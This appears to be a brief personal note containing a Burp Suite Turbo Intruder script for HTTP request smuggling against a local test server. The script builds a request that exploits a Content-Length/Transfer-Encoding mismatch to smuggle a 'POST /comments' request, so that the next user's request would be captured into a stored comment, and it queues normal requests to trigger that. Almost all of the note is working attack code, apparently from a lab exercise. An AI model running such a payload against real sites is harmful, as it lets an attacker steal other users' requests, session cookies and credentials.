# Burp Trubo Intruder

```py
def queueRequests(target, _):
    engine = RequestEngine(endpoint="http://localhost:80",
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False
                           )
    
    # attack request
    attack_request = """POST / HTTP/1.1
Host: localhost
Connection: keep-alive
Content-Length: 78
Transfer-Encoding:chunked

1
A
0

POST /comments HTTP/1.1
X-Foo: bar
Content-Length: 61

commeny="""

    normal_request = """GET / HTTP/1.1
Host: 127.0.0.1:80
Connection: close

"""
    engine.queue(attack_request)
    engine.queue(normal_request)
    engine.queue(normal_request)
 
 
def handleResponse(req, _):
    table.add(req)
```

the ^L is \0xb.
